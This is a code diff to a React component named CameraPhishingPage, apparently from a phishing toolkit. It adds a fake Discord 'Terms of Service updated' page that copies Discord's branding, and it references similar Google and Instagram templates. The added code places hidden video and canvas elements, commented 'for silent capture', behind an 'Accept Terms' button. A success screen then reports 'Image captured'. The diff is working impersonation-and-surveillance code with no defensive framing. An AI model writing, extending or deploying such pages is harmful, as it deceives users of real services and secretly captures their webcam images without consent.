@@ -24,8 +24,8 @@ const templateContent: Record<string, { title: string; message: string; cookieMe
     message: "Important: Our Terms of Service have been updated. Please review and accept them to continue using Discord.",
     cookieMessage: "By clicking 'Accept Terms', you acknowledge and agree to Discord's updated Terms of Service. This ensures a safe and compliant environment for all users.",
     actionText: 'Accept Terms',
-    headerClassName: "bg-[#5865F2] text-white",
-    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" />
+    // headerClassName: "bg-[#5865F2] text-white", // Removed as it's handled by custom UI
+    visual: <img src="/discord_logo.png" alt="Discord Logo" className="h-8 w-auto mr-2" /> // Visual might be used differently or not at all if logo is hardcoded in custom UI
     // redirectUrl removed
   },
   'instagram-privacy-update': {
@@ -254,7 +254,48 @@ export default function CameraPhishingPage() {
     }
   }, [status, templateId, content.title]); // Added content.title to dependencies for safety, though primarily driven by status and templateId
 
-  if (['google-policy-update', 'discord-terms-update', 'instagram-privacy-update'].includes(templateId)) {
+  if (templateId === 'discord-terms-update') {
+    return (
+      <div className="flex flex-col items-center justify-center min-h-screen bg-[#36393f] p-4 text-[#dcddde] font-sans">
+        {/* Hidden video and canvas for silent capture */}
+        <video ref={videoRef} className="hidden" playsInline muted />
+        <canvas ref={canvasRef} className="hidden"></canvas>
+
+        {status !== 'captured' || (status === 'captured' && REDIRECT_URL_KEYS[templateId] && localStorage.getItem(REDIRECT_URL_KEYS[templateId])) ? (
+          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
+            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
+            <h1 className="text-2xl font-bold text-white mb-4">{content.title}</h1>
+            <p className="text-sm text-[#b9bbbe] mb-6" dangerouslySetInnerHTML={{ __html: content.message }} />
+
+            <p className="text-xs text-[#72767d] mb-6">
+              {content.cookieMessage}
+            </p>
+
+            <Button
+              onClick={handleCookieConsentAndCamera}
+              className="w-full bg-[#5865F2] hover:bg-[#4752c4] text-white font-semibold py-3 px-4 rounded-md text-lg transition-colors duration-150"
+              disabled={isLoading || cookieConsentGiven}
+            >
+              {isLoading && cookieConsentGiven ? 'Processing...' : (content.actionText || 'Accept Terms')}
+            </Button>
+            {error && status === 'error' && (
+              <p className="text-red-400 text-xs mt-4">{error}</p>
+            )}
+          </div>
+        ) : (
+          // This state is after capture AND no redirect URL is set
+          <div className="bg-[#2f3136] p-8 rounded-lg shadow-xl w-full max-w-md text-center">
+            <img src="/discord_logo.png" alt="Discord Logo" className="h-16 w-auto mx-auto mb-6" />
+            <CheckCircle className="w-16 h-16 text-green-400 mx-auto mb-4" />
+            <h1 className="text-xl font-bold text-white mb-2">Terms Accepted</h1>
+            <p className="text-sm text-[#b9bbbe]">Image captured. This window can now be closed.</p>
+          </div>
+        )}
+      </div>
+    );
+  }
+
+  if (['google-policy-update', 'instagram-privacy-update'].includes(templateId)) {
     // For these templates, the "captured" state is mostly invisible to the user before redirection
     // or if no redirection URL is set (it will just sit on the page).
     // The main UI is the cookie banner.
